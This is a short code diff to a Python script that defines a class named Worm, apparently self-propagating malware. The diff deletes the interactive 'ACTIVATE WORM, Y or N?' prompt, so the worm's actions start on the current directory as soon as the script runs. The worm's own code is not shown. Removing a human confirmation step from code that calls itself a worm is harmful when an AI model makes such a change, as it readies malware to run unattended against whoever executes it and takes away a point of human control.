@@ -62,8 +62,6 @@ class Worm:
 
 
 if __name__=="__main__":
-    activate = input("ACTIVATE WORM, Y or N?")
-    if activate == "Y" or "y":
       current_directory = os.path.abspath("")
       worm = Worm(path=current_directory)
       worm.start_worm_actions()
